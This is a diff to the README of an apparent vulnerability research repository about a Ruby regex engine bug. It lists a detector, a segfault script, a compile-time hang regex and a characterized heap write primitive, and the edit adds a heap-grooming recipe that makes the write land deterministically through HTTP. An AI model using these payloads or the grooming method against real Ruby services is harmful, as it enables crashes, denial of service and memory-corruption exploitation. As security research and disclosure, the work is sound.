@@ -33,7 +33,7 @@ See [research-writeup](docs/research-writeup.md) §7.
 | Safe detector: **VULNERABLE** on 3.4.11 / **NOT-DETECTED** on 3.4.12, zero crashes | `poc/diagnose.py` — org-sink compile oracle + engine compile-only corroboration + benign control; 3/3+3/3 each way, exit 0/1 |
 | Deterministic kill: `[BUG]` SIGSEGV at `re.match` (N=100000, ID-aliasing zone ≥65536), harness alive | `poc/crash.py` — 3/3 kills; fixed build survives identical attack 3/3 (clean `RegexpError`) |
 | The #19020 sibling arm: compile-time unroll hang | `(?:.{90000,}){90000}` → 15s TIMEOUT on vuln vs 89ms clean compile on fixed |
-| Match-time write primitive, characterized | `exploit/echo.py` + gdb autopsy: 8-byte write at `repeat_stk[id]` (regexec.c:3846), **value = repeat index + δ, offset = wrapped id × 8**; deterministic in-process marker echo (`marker[2938]+832 = 0x800e`); impossible-nested pair disables the count walk → pure write |
+| Match-time write primitive, characterized — and echoed deterministically through the harness | `exploit/echo.py` + gdb autopsy: 8-byte write at `repeat_stk[id]` (regexec.c:3846), **value = repeat index + δ, offset = wrapped id × 8**; impossible-nested pair disables the count walk → pure write. Stage-3 construction (odd/tasks L14): `MALLOC_MMAP_THRESHOLD_`=4 MiB + post-compile marker band (8000×'M'4096, exhausts compile-freed brk holes) + exact-fit anchor (`'A'×((units+4)×8+65520)`, freed by two full GCs) → repeat_stk reuses the anchor hole and the wrapped write lands in the band: **band echo 4/4 standalone, 2/3 via HTTP** (observed 0x800c/0x800e = stack depth); fixed build rejects the identical request at compile |
 
 ## Quick start
 
@@ -46,8 +46,11 @@ python3 poc/diagnose.py --port 29566          # NOT-DETECTED (exit 1)
 
 python3 poc/crash.py --rounds 3 --check-fixed # 3/3 [BUG] kills; fixed survives
 
-python3 exploit/echo.py --port 29565          # write-primitive probe (echo landing
-                                               # through the harness is layout-dependent)
+python3 exploit/echo.py --port 29565          # write-primitive echo (stage-3
+                                               # construction: deterministic;
+                                               # the match hits Regexp.timeout
+                                               # in this layout — expected, the
+                                               # band scan still reports)
 ```
 
 Everything Ruby-side runs inside Docker; the host only needs Python 3
